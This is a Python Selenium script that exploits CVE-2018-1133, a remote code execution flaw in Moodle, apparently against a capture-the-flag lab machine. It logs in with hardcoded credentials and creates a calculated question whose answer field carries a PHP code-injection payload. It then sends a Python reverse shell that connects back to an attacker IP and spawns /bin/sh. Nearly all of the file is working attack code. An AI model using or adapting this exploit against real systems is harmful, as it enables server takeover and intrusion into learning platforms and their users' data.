import selenium.webdriver as webdriver

"""
Script for exploiting CVE-2018-1133 for Moodle

https://blog.ripstech.com/2018/moodle-remote-code-execution/
"""

IP = "10.10.14.55"
PORT = "6868"

PAYLOAD = "/*{a*/`$_GET[0]`;//{x}}"
REVERSE_SHELL = f"&0=(python -c \'import socket,subprocess,os;IP=\"{IP}\";PORT={PORT};s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((IP,PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\')"

base_url = "http://10.10.10.153/moodle/login/index.php"

driver = webdriver.Firefox()
driver.get(base_url)

# Login
username = "giovanni"
password = "Th4C00lTheacha#"

usernameBox_XPath = "//*[@id=\"username\"]"
passwordBox_XPath = "//*[@id=\"password\"]"
loginButton_XPath = "//*[@id=\"loginbtn\"]"

usernameBox = driver.find_element_by_xpath(usernameBox_XPath)
passwordBox = driver.find_element_by_xpath(passwordBox_XPath)
loginButton = driver.find_element_by_xpath(loginButton_XPath)

usernameBox.send_keys(username)
passwordBox.send_keys(password)
loginButton.click()

# Question Select
question_url = "http://10.10.10.153/moodle/question/edit.php?courseid=2"

driver.get(question_url)

buttons = driver.find_elements_by_tag_name("button")

# Searches for the dynamic button
for b in buttons:
    if "Create a new question" in b.text:
        b.click()

caculatedRadioButton = driver.find_element_by_xpath("//*[@id=\"item_qtype_calculated\"]")
caculatedRadioButton.click()

addQuestionButton = driver.find_element_by_class_name("submitbutton")
addQuestionButton.click()

# Adding Question data
driver.find_element_by_xpath("//*[@id=\"id_name\"]").send_keys("x")
driver.find_element_by_xpath("//*[@id=\"id_questiontexteditable\"]").send_keys("x")
driver.find_element_by_xpath("//*[@id=\"id_answer_0\"]").send_keys(PAYLOAD)
driver.find_element_by_xpath("//*[@id=\"id_fraction_0\"]/option[text()='100%']").click()
driver.find_element_by_xpath("//*[@id=\"id_submitbutton\"]").click()
driver.find_element_by_xpath("//*[@id=\"id_submitbutton\"]").click()

current_url = driver.current_url
expolit_url = current_url + REVERSE_SHELL

driver.get(expolit_url)
driver.close()